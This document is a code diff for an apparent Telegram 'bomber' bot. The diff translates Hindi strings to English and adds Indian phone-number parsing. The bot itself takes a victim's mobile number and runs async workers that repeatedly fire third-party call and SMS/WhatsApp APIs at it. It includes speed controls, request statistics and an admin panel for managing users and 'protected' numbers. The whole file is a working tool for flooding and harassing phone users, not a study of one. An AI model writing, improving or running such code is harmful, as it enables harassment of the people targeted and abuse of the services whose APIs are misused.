@@ -2,10 +2,9 @@
 import asyncio
 import logging
 import time
-import io
-import json
-from datetime import datetime, timedelta
-from typing import Dict, List, Optional
+import re
+from datetime import datetime
+from typing import Dict, List
 
 import aiohttp
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -19,7 +18,7 @@ from config import *
 from database import *
 
 # ------------------------------------------------------------------
-# लॉगिंग सेटअप
+# Logging Setup
 # ------------------------------------------------------------------
 logging.basicConfig(
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
@@ -28,23 +27,22 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # ------------------------------------------------------------------
-# ग्लोबल स्टेट (बॉम्बिंग सेशन मैनेजमेंट)
+# Global State (Bombing Session Management)
 # ------------------------------------------------------------------
-bombing_events: Dict[int, asyncio.Event] = {}      # user_id -> stop_event
-bombing_tasks: Dict[int, List[asyncio.Task]] = {}  # user_id -> [call_task, sms_task]
-user_intervals: Dict[int, Dict[str, int]] = {}     # user_id -> {"call": sec, "sms": sec}
-user_mode: Dict[int, str] = {}                     # user_id -> BOMB_MODE_*
-request_counts: Dict[int, int] = {}                # user_id -> total_requests
-status_msg_ids: Dict[int, int] = {}                # user_id -> message_id
+bombing_events: Dict[int, asyncio.Event] = {}
+bombing_tasks: Dict[int, List[asyncio.Task]] = {}
+user_intervals: Dict[int, Dict[str, int]] = {}
+user_mode: Dict[int, str] = {}
+request_counts: Dict[int, int] = {}
+status_msg_ids: Dict[int, int] = {}
 
 BOMB_MODE_CALL_ONLY = "call"
 BOMB_MODE_SMS_ONLY = "sms"
 BOMB_MODE_BOTH = "both"
 
-# एडमिन स्टेट्स (कन्वर्सेशन के लिए)
+# Admin States (for conversation)
 STATE_NONE = 0
 STATE_AWAITING_PHONE = 1
-STATE_AWAITING_MODE = 2
 STATE_ADMIN_BAN = 10
 STATE_ADMIN_UNBAN = 11
 STATE_ADMIN_DELETE = 12
@@ -59,15 +57,47 @@ STATE_ADMIN_DM_MESSAGE = 20
 STATE_ADMIN_SET_CALL_INTERVAL = 21
 STATE_ADMIN_SET_SMS_INTERVAL = 22
 
-# यूजर डेटा स्टोर करने के लिए (अस्थायी)
+# Temporary user data
 user_states: Dict[int, int] = {}
 user_temp_data: Dict[int, Dict] = {}
 
 # ------------------------------------------------------------------
-# सेल्फ-पिंग (Render को 24/7 जिंदा रखने के लिए)
+# Phone Number Cleaning (New Feature)
+# ------------------------------------------------------------------
+def clean_phone_number(text: str) -> str | None:
+    """
+    Extract 10-digit Indian mobile number from any messy input.
+    Examples:
+        "+91 98765 43210" -> "9876543210"
+        "919876543210"    -> "9876543210"
+        "09876543210"     -> "9876543210"
+        "9876 543 210"    -> "9876543210"
+    """
+    if not text:
+        return None
+    # Extract only digits
+    digits = re.sub(r"\D", "", text)
+
+    if len(digits) < 10:
+        return None
+
+    # If more than 10 digits, try to extract the Indian number
+    if len(digits) > 10:
+        # Case 1: Starts with 91 and has 12 digits (91 + 10 digits)
+        if digits.startswith("91") and len(digits) == 12:
+            return digits[2:]
+        # Case 2: Starts with 0 and has 11 digits (0 + 10 digits)
+        if digits.startswith("0") and len(digits) == 11:
+            return digits[1:]
+        # Case 3: Fallback - take last 10 digits
+        return digits[-10:]
+
+    return digits
+
+# ------------------------------------------------------------------
+# Self-Ping (Keep Render alive 24/7)
 # ------------------------------------------------------------------
 async def keep_alive():
-    """हर 5 मिनट में खुद को पिंग करें।"""
     await asyncio.sleep(10)
     while True:
         try:
@@ -76,13 +106,12 @@ async def keep_alive():
                     logger.info(f"Keep-alive ping, status: {resp.status}")
         except Exception as e:
             logger.error(f"Keep-alive failed: {e}")
-        await asyncio.sleep(5 * 60)  # 5 मिनट
+        await asyncio.sleep(5 * 60)
 
 # ------------------------------------------------------------------
-# API हिटर (असिंक्रोनस)
+# Async API Hitter
 # ------------------------------------------------------------------
 async def hit_api(session: aiohttp.ClientSession, api: dict, phone: str) -> bool:
-    """एक API को हिट करें और सफलता का बूलियन लौटाएँ।"""
     try:
         url = api["url"].replace("{phone}", phone)
         method = api.get("method", "GET")
@@ -102,7 +131,7 @@ async def hit_api(session: aiohttp.ClientSession, api: dict, phone: str) -> bool
         return False
 
 # ------------------------------------------------------------------
-# कॉल वर्कर (एक-एक API हर X सेकंड पर)
+# Call Worker (one-by-one every X seconds)
 # ------------------------------------------------------------------
 async def call_worker(user_id: int, phone: str, stop_event: asyncio.Event, context: ContextTypes.DEFAULT_TYPE):
     idx = 0
@@ -116,14 +145,13 @@ async def call_worker(user_id: int, phone: str, stop_event: asyncio.Event, conte
                 if success:
                     request_counts[user_id] = request_counts.get(user_id, 0) + 1
                 idx = (idx + 1) % total
-            # इंटरवल के दौरान स्टॉप चेक करें
             for _ in range(interval):
                 if stop_event.is_set():
                     return
                 await asyncio.sleep(1)
 
 # ------------------------------------------------------------------
-# SMS/WhatsApp वर्कर (सब एक साथ हर X सेकंड पर)
+# SMS/WhatsApp Worker (all at once every X seconds)
 # ------------------------------------------------------------------
 async def sms_worker(user_id: int, phone: str, stop_event: asyncio.Event, context: ContextTypes.DEFAULT_TYPE):
     async with aiohttp.ClientSession() as session:
@@ -140,18 +168,16 @@ async def sms_worker(user_id: int, phone: str, stop_event: asyncio.Event, contex
                 await asyncio.sleep(1)
 
 # ------------------------------------------------------------------
-# बॉम्बिंग सेशन स्टार्ट करें
+# Start Bombing Session
 # ------------------------------------------------------------------
 async def start_bombing_session(user_id: int, phone: str, mode: str, context: ContextTypes.DEFAULT_TYPE):
     if user_id in bombing_events:
-        return False, "❌ पहले से ही बॉम्बिंग चल रही है!"
+        return False, "❌ Already bombing!"
 
-    # प्रोटेक्टेड नंबर चेक (एडमिन/ओनर को छूट)
     if not (await is_admin(user_id) or await is_owner(user_id)):
         if await is_protected(phone):
-            return False, "⚠️ यह नंबर प्रोटेक्टेड है और इस पर बॉम्बिंग नहीं की जा सकती।"
+            return False, "⚠️ This number is protected and cannot be bombed."
 
-    # सेटिंग्स लोड करें
     settings = await get_settings()
     user_intervals[user_id] = {
         "call": settings["call_interval"],
@@ -171,31 +197,30 @@ async def start_bombing_session(user_id: int, phone: str, mode: str, context: Co
 
     bombing_tasks[user_id] = tasks
 
-    # कंट्रोल कीबोर्ड
     kb = InlineKeyboardMarkup([
-        [InlineKeyboardButton("🛑 रोकें", callback_data="stop_bombing"),
-         InlineKeyboardButton("⚡ तेज़ करें", callback_data="speed_up"),
-         InlineKeyboardButton("🐢 धीमा करें", callback_data="speed_down")],
-        [InlineKeyboardButton("📊 स्टैट्स", callback_data="bombing_stats"),
-         InlineKeyboardButton("🏠 मुख्य मेनू", callback_data="main_menu")]
+        [InlineKeyboardButton("🛑 Stop", callback_data="stop_bombing"),
+         InlineKeyboardButton("⚡ Speed Up", callback_data="speed_up"),
+         InlineKeyboardButton("🐢 Speed Down", callback_data="speed_down")],
+        [InlineKeyboardButton("📊 Stats", callback_data="bombing_stats"),
+         InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
     ])
     msg = await context.bot.send_message(
         chat_id=user_id,
         text=(
-            f"💣 <b>बॉम्बिंग शुरू!</b>\n"
-            f"📱 टारगेट: <code>+91{phone}</code>\n"
-            f"📞 कॉल APIs: {len(CALL_APIS)} (अंतराल: {user_intervals[user_id]['call']}s)\n"
-            f"💬 SMS/WhatsApp: {len(SMS_WHATSAPP_APIS)} (अंतराल: {user_intervals[user_id]['sms']}s)\n"
-            f"🎯 मोड: {mode}"
+            f"💣 <b>Bombing Started!</b>\n"
+            f"📱 Target: <code>+91{phone}</code>\n"
+            f"📞 Call APIs: {len(CALL_APIS)} (interval: {user_intervals[user_id]['call']}s)\n"
+            f"💬 SMS/WhatsApp: {len(SMS_WHATSAPP_APIS)} (interval: {user_intervals[user_id]['sms']}s)\n"
+            f"🎯 Mode: {mode}"
         ),
         parse_mode=ParseMode.HTML,
         reply_markup=kb
     )
     status_msg_ids[user_id] = msg.message_id
-    return True, "✅ बॉम्बिंग शुरू हो गई!"
+    return True, "✅ Bombing started!"
 
 # ------------------------------------------------------------------
-# बॉम्बिंग रोकें
+# Stop Bombing
 # ------------------------------------------------------------------
 async def stop_bombing_session(user_id: int, context: ContextTypes.DEFAULT_TYPE):
     stop_event = bombing_events.pop(user_id, None)
@@ -212,37 +237,36 @@ async def stop_bombing_session(user_id: int, context: ContextTypes.DEFAULT_TYPE)
         try:
             await context.bot.edit_message_text(
                 chat_id=user_id, message_id=msg_id,
-                text=f"🛑 रोक दिया गया। कुल रिक्वेस्ट: {count}{BRANDING}",
+                text=f"🛑 Stopped. Total requests: {count}{BRANDING}",
                 parse_mode=ParseMode.HTML
             )
         except:
             pass
     else:
-        await context.bot.send_message(chat_id=user_id, text=f"🛑 रोक दिया गया। कुल रिक्वेस्ट: {count}")
+        await context.bot.send_message(chat_id=user_id, text=f"🛑 Stopped. Total requests: {count}")
 
 # ------------------------------------------------------------------
-# स्पीड एडजस्ट करें
+# Adjust Speed
 # ------------------------------------------------------------------
 async def adjust_speed(user_id: int, increase: bool, context: ContextTypes.DEFAULT_TYPE):
     if user_id not in user_intervals:
-        await context.bot.send_message(chat_id=user_id, text="कोई सक्रिय सत्र नहीं है।")
+        await context.bot.send_message(chat_id=user_id, text="No active session.")
         return
     intervals = user_intervals[user_id]
     if increase:
         intervals["call"] = max(5, intervals["call"] - 2)
         intervals["sms"] = max(2, intervals["sms"] - 1)
-        msg = f"⚡ गति बढ़ी। कॉल: {intervals['call']}s, SMS: {intervals['sms']}s"
+        msg = f"⚡ Speed increased. Call: {intervals['call']}s, SMS: {intervals['sms']}s"
     else:
         intervals["call"] = min(60, intervals["call"] + 2)
         intervals["sms"] = min(30, intervals["sms"] + 1)
-        msg = f"🐢 गति घटी। कॉल: {intervals['call']}s, SMS: {intervals['sms']}s"
+        msg = f"🐢 Speed decreased. Call: {intervals['call']}s, SMS: {intervals['sms']}s"
     await context.bot.send_message(chat_id=user_id, text=msg)
 
 # ------------------------------------------------------------------
-# मीडिया ब्रॉडकास्ट / डीएम हेल्पर
+# Send Any Media (Broadcast/DM Helper)
 # ------------------------------------------------------------------
 async def send_any_message(bot, chat_id: int, update: Update, text: str = None):
-    """किसी भी प्रकार का मैसेज (टेक्स्ट, फोटो, वीडियो, आदि) भेजें।"""
     try:
         msg = update.message
         if msg.reply_to_message:
@@ -284,17 +308,17 @@ async def send_any_message(bot, chat_id: int, update: Update, text: str = None):
         return False
 
 # ------------------------------------------------------------------
-# कमांड हैंडलर्स
+# Command Handlers
 # ------------------------------------------------------------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     await add_user(user.id, user.username, user.first_name)
     kb = [
-        [InlineKeyboardButton("💣 बॉम्बिंग शुरू करें", callback_data="choose_mode")],
-        [InlineKeyboardButton("👑 एडमिन पैनल", callback_data="admin_panel")]
+        [InlineKeyboardButton("💣 Start Bomber", callback_data="choose_mode")],
+        [InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")]
     ]
     await update.message.reply_text(
-        f"नमस्ते {user.first_name}! 👋\nकोई विकल्प चुनें:",
+        f"Welcome {user.first_name}! 👋\nChoose an option:",
         reply_markup=InlineKeyboardMarkup(kb)
     )
 
@@ -304,55 +328,55 @@ async def menu_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if not (await is_admin(user_id) or await is_owner(user_id)):
-        await update.message.reply_text("⛔ अनधिकृत।")
+        await update.message.reply_text("⛔ Unauthorized.")
         return
     await show_admin_panel(update.message, user_id)
 
 async def show_admin_panel(target, user_id: int):
     kb = [
-        [InlineKeyboardButton("👥 यूजर लिस्ट", callback_data="admin_users_list")],
-        [InlineKeyboardButton("🔍 यूजर देखें", callback_data="admin_lookup")],
-        [InlineKeyboardButton("🚫 बैन करें", callback_data="admin_ban"),
-         InlineKeyboardButton("🔓 अनबैन करें", callback_data="admin_unban"),
-         InlineKeyboardButton("🗑 डिलीट करें", callback_data="admin_delete")],
-        [InlineKeyboardButton("➕ एडमिन बनाएं", callback_data="admin_addadmin"),
-         InlineKeyboardButton("➖ एडमिन हटाएं", callback_data="admin_removeadmin")],
-        [InlineKeyboardButton("🛡️ प्रोटेक्ट नंबर", callback_data="admin_protect"),
-         InlineKeyboardButton("🔓 हटाएं", callback_data="admin_unprotect"),
-         InlineKeyboardButton("📜 लिस्ट", callback_data="admin_list_protected")],
-        [InlineKeyboardButton("⚙️ इंटरवल सेट करें", callback_data="admin_set_intervals")],
-        [InlineKeyboardButton("📢 ब्रॉडकास्ट", callback_data="admin_broadcast"),
-         InlineKeyboardButton("📨 डायरेक्ट मैसेज", callback_data="admin_dm")],
-        [InlineKeyboardButton("🔙 मुख्य मेनू", callback_data="main_menu")]
+        [InlineKeyboardButton("👥 User List", callback_data="admin_users_list")],
+        [InlineKeyboardButton("🔍 Lookup User", callback_data="admin_lookup")],
+        [InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban"),
+         InlineKeyboardButton("🔓 Unban User", callback_data="admin_unban"),
+         InlineKeyboardButton("🗑 Delete User", callback_data="admin_delete")],
+        [InlineKeyboardButton("➕ Add Admin", callback_data="admin_addadmin"),
+         InlineKeyboardButton("➖ Remove Admin", callback_data="admin_removeadmin")],
+        [InlineKeyboardButton("🛡️ Protect Number", callback_data="admin_protect"),
+         InlineKeyboardButton("🔓 Unprotect", callback_data="admin_unprotect"),
+         InlineKeyboardButton("📜 List Protected", callback_data="admin_list_protected")],
+        [InlineKeyboardButton("⚙️ Set Intervals", callback_data="admin_set_intervals")],
+        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
+         InlineKeyboardButton("📨 Direct Message", callback_data="admin_dm")],
+        [InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]
     ]
-    text = "👑 <b>एडमिन पैनल</b>\nएक क्रिया चुनें:"
+    text = "👑 <b>Admin Panel</b>\nSelect an action:"
     if hasattr(target, 'edit_text'):
         await target.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))
     else:
         await target.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))
 
 # ------------------------------------------------------------------
-# कॉलबैक हैंडलर्स
+# Callback Handlers
 # ------------------------------------------------------------------
 async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     kb = [
-        [InlineKeyboardButton("💣 बॉम्बिंग शुरू करें", callback_data="choose_mode")],
-        [InlineKeyboardButton("👑 एडमिन पैनल", callback_data="admin_panel")]
+        [InlineKeyboardButton("💣 Start Bomber", callback_data="choose_mode")],
+        [InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")]
     ]
-    await query.edit_message_text("मुख्य मेनू:", reply_markup=InlineKeyboardMarkup(kb))
+    await query.edit_message_text("Main Menu:", reply_markup=InlineKeyboardMarkup(kb))
 
 async def choose_mode_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     kb = [
-        [InlineKeyboardButton("📞 केवल कॉल", callback_data="mode_call")],
-        [InlineKeyboardButton("💬 केवल SMS/WA", callback_data="mode_sms")],
-        [InlineKeyboardButton("🔥 दोनों", callback_data="mode_both")],
-        [InlineKeyboardButton("🔙 वापस", callback_data="main_menu")]
+        [InlineKeyboardButton("📞 Only Call", callback_data="mode_call")],
+        [InlineKeyboardButton("💬 Only SMS/WA", callback_data="mode_sms")],
+        [InlineKeyboardButton("🔥 Both", callback_data="mode_both")],
+        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
     ]
-    await query.edit_message_text("बॉम्बिंग मोड चुनें:", reply_markup=InlineKeyboardMarkup(kb))
+    await query.edit_message_text("Select bombing mode:", reply_markup=InlineKeyboardMarkup(kb))
 
 async def mode_selected_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -368,8 +392,8 @@ async def mode_selected_callback(update: Update, context: ContextTypes.DEFAULT_T
     user_temp_data[user_id] = {"bomb_mode": mode}
     user_states[user_id] = STATE_AWAITING_PHONE
     await query.edit_message_text(
-        "📱 कृपया 10 अंकों का फ़ोन नंबर भेजें (बिना +91):",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="main_menu")]])
+        "📱 Send 10-digit phone number (without +91):",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="main_menu")]])
     )
 
 async def stop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -392,17 +416,17 @@ async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     user_id = query.from_user.id
     if user_id not in request_counts:
-        await query.edit_message_text("कोई सक्रिय सत्र नहीं है।")
+        await query.edit_message_text("No active session.")
         return
     count = request_counts[user_id]
     intervals = user_intervals.get(user_id, {})
     mode = user_mode.get(user_id, "N/A")
     await query.edit_message_text(
-        f"📊 <b>स्टैट्स</b>\n"
-        f"📱 कुल रिक्वेस्ट: {count}\n"
-        f"🎯 मोड: {mode}\n"
-        f"📞 कॉल अंतराल: {intervals.get('call', '?')}s\n"
-        f"💬 SMS अंतराल: {intervals.get('sms', '?')}s",
+        f"📊 <b>Stats</b>\n"
+        f"📱 Total Requests: {count}\n"
+        f"🎯 Mode: {mode}\n"
+        f"📞 Call Interval: {intervals.get('call', '?')}s\n"
+        f"💬 SMS Interval: {intervals.get('sms', '?')}s",
         parse_mode=ParseMode.HTML
     )
 
@@ -411,24 +435,22 @@ async def admin_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYP
     await query.answer()
     user_id = query.from_user.id
     if not (await is_admin(user_id) or await is_owner(user_id)):
-        await query.edit_message_text("⛔ अनधिकृत।")
+        await query.edit_message_text("⛔ Unauthorized.")
         return
     await show_admin_panel(query, user_id)
 
-# ------------------------------------------------------------------
-# एडमिन कॉलबैक (बैन, अनबैन, आदि)
-# ------------------------------------------------------------------
+# Admin callback functions
 async def admin_users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     users = await get_all_users_paginated(0, 15)
     if not users:
-        await query.edit_message_text("कोई यूजर नहीं।")
+        await query.edit_message_text("No users found.")
         return
-    text = "👥 <b>यूजर लिस्ट (पेज 1)</b>\n\n"
+    text = "👥 <b>User List (Page 1)</b>\n\n"
     for u in users:
-        text += f"🆔 {u['user_id']} | @{u.get('username','?')} | {'🔴 बैन' if u.get('banned') else '🟢 एक्टिव'}\n"
-    kb = [[InlineKeyboardButton("🔙 वापस", callback_data="admin_panel")]]
+        text += f"🆔 {u['user_id']} | @{u.get('username','?')} | {'🔴 Banned' if u.get('banned') else '🟢 Active'}\n"
+    kb = [[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]
     await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))
 
 async def admin_ban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -436,8 +458,8 @@ async def admin_ban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE)
     await query.answer()
     user_states[query.from_user.id] = STATE_ADMIN_BAN
     await query.edit_message_text(
-        "🚫 जिसे बैन करना है उसका यूजर ID भेजें:",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
+        "🚫 Send User ID to ban:",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
     )
 
 async def admin_unban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -445,8 +467,8 @@ async def admin_unban_callback(update: Update, context: ContextTypes.DEFAULT_TYP
     await query.answer()
     user_states[query.from_user.id] = STATE_ADMIN_UNBAN
     await query.edit_message_text(
-        "🔓 जिसे अनबैन करना है उसका यूजर ID भेजें:",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
+        "🔓 Send User ID to unban:",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
     )
 
 async def admin_delete_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -454,8 +476,8 @@ async def admin_delete_callback(update: Update, context: ContextTypes.DEFAULT_TY
     await query.answer()
     user_states[query.from_user.id] = STATE_ADMIN_DELETE
     await query.edit_message_text(
-        "🗑 जिसे डिलीट करना है उसका यूजर ID भेजें:",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
+        "🗑 Send User ID to delete:",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
     )
 
 async def admin_lookup_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -463,8 +485,8 @@ async def admin_lookup_callback(update: Update, context: ContextTypes.DEFAULT_TY
     await query.answer()
     user_states[query.from_user.id] = STATE_ADMIN_LOOKUP
     await query.edit_message_text(
-        "🔍 यूजर ID भेजें:",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
+        "🔍 Send User ID to lookup:",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
     )
 
 async def admin_addadmin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -472,8 +494,8 @@ async def admin_addadmin_callback(update: Update, context: ContextTypes.DEFAULT_
     await query.answer()
     user_states[query.from_user.id] = STATE_ADMIN_ADDADMIN
     await query.edit_message_text(
-        "➕ एडमिन बनाने के लिए यूजर ID भेजें:",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
+        "➕ Send User ID to promote to admin:",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
     )
 
 async def admin_removeadmin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -481,8 +503,8 @@ async def admin_removeadmin_callback(update: Update, context: ContextTypes.DEFAU
     await query.answer()
     user_states[query.from_user.id] = STATE_ADMIN_REMOVEADMIN
     await query.edit_message_text(
-        "➖ एडमिन से हटाने के लिए यूजर ID भेजें:",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
+        "➖ Send User ID to demote from admin:",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
     )
 
 async def admin_protect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -490,8 +512,8 @@ async def admin_protect_callback(update: Update, context: ContextTypes.DEFAULT_T
     await query.answer()
     user_states[query.from_user.id] = STATE_ADMIN_PROTECT
     await query.edit_message_text(
-        "🛡️ प्रोटेक्ट करने के लिए 10 अंकों का नंबर भेजें:",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
+        "🛡️ Send 10-digit number to protect:",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
     )
 
 async def admin_unprotect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -499,8 +521,8 @@ async def admin_unprotect_callback(update: Update, context: ContextTypes.DEFAULT
     await query.answer()
     user_states[query.from_user.id] = STATE_ADMIN_UNPROTECT
     await query.edit_message_text(
-        "🔓 प्रोटेक्शन हटाने के लिए 10 अंकों का नंबर भेजें:",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
+        "🔓 Send 10-digit number to remove protection:",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
     )
 
 async def admin_list_protected_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -508,29 +530,29 @@ async def admin_list_protected_callback(update: Update, context: ContextTypes.DE
     await query.answer()
     numbers = await get_all_protected_numbers()
     if not numbers:
-        text = "कोई प्रोटेक्टेड नंबर नहीं है।"
+        text = "No protected numbers."
     else:
-        text = "🛡️ <b>प्रोटेक्टेड नंबर:</b>\n" + "\n".join(f"<code>{n}</code>" for n in numbers)
+        text = "🛡️ <b>Protected Numbers:</b>\n" + "\n".join(f"<code>{n}</code>" for n in numbers)
     await query.edit_message_text(text, parse_mode=ParseMode.HTML,
-                                  reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 वापस", callback_data="admin_panel")]]))
+                                  reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))
 
 async def admin_set_intervals_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     kb = [
-        [InlineKeyboardButton("📞 कॉल इंटरवल", callback_data="set_call_interval")],
-        [InlineKeyboardButton("💬 SMS इंटरवल", callback_data="set_sms_interval")],
-        [InlineKeyboardButton("🔙 वापस", callback_data="admin_panel")]
+        [InlineKeyboardButton("📞 Call Interval", callback_data="set_call_interval")],
+        [InlineKeyboardButton("💬 SMS Interval", callback_data="set_sms_interval")],
+        [InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]
     ]
-    await query.edit_message_text("किसका इंटरवल बदलना है?", reply_markup=InlineKeyboardMarkup(kb))
+    await query.edit_message_text("Which interval do you want to change?", reply_markup=InlineKeyboardMarkup(kb))
 
 async def set_call_interval_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     user_states[query.from_user.id] = STATE_ADMIN_SET_CALL_INTERVAL
     await query.edit_message_text(
-        "📞 कॉल API के लिए नया इंटरवल (सेकंड में) भेजें:",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
+        "📞 Send new interval in seconds for Call API:",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
     )
 
 async def set_sms_interval_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -538,8 +560,8 @@ async def set_sms_interval_callback(update: Update, context: ContextTypes.DEFAUL
     await query.answer()
     user_states[query.from_user.id] = STATE_ADMIN_SET_SMS_INTERVAL
     await query.edit_message_text(
-        "💬 SMS/WhatsApp API के लिए नया इंटरवल (सेकंड में) भेजें:",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
+        "💬 Send new interval in seconds for SMS/WhatsApp API:",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
     )
 
 async def admin_broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -547,9 +569,9 @@ async def admin_broadcast_callback(update: Update, context: ContextTypes.DEFAULT
     await query.answer()
     user_states[query.from_user.id] = STATE_ADMIN_BROADCAST
     await query.edit_message_text(
-        "📢 ब्रॉडकास्ट के लिए मैसेज (टेक्स्ट, फोटो, वीडियो आदि) भेजें।\n"
-        "आप रिप्लाई में कोई भी मीडिया अटैच कर सकते हैं।",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
+        "📢 Send the message you want to broadcast (text, photo, video, etc.).\n"
+        "You can attach any media by replying.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
     )
 
 async def admin_dm_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -557,29 +579,39 @@ async def admin_dm_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     user_states[query.from_user.id] = STATE_ADMIN_DM_TARGET
     await query.edit_message_text(
-        "📨 जिसे DM करना है उसका यूजर ID भेजें:",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 रद्द करें", callback_data="admin_panel")]])
+        "📨 Send User ID to DM:",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
     )
 
 # ------------------------------------------------------------------
-# मैसेज हैंडलर (यूजर इनपुट और एडमिन स्टेट्स)
+# Message Handler (User Input and Admin States)
 # ------------------------------------------------------------------
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     state = user_states.get(user_id, STATE_NONE)
     text = update.message.text.strip() if update.message.text else ""
 
-    # --- फ़ोन नंबर इनपुट (बॉम्बिंग के लिए) ---
+    # Phone input for bombing
     if state == STATE_AWAITING_PHONE:
-        phone = ''.join(filter(str.isdigit, text))
-        if len(phone) != 10:
-            await update.message.reply_text("❌ अमान्य नंबर। 10 अंक भेजें।")
+        cleaned = clean_phone_number(text)
+        if not cleaned:
+            await update.message.reply_text(
+                "❌ <b>Invalid Number Format!</b>\n\n"
+                "Please send a valid 10-digit Indian mobile number.\n"
+                "<i>Examples: 9876543210, +91 98765 43210, 919876543210</i>",
+                parse_mode=ParseMode.HTML
+            )
             return
+
+        phone = cleaned
+
+        # Self-bombing check
         user_phone = await get_user_phone(user_id)
         if user_phone == phone:
-            await update.message.reply_text("❌ अपने ही नंबर पर बॉम्बिंग नहीं कर सकते!")
+            await update.message.reply_text("❌ <b>Self-Bombing Blocked!</b>\nYou cannot target your own number.", parse_mode=ParseMode.HTML)
             user_states.pop(user_id, None)
             return
+
         temp = user_temp_data.get(user_id, {})
         mode = temp.get("bomb_mode", BOMB_MODE_BOTH)
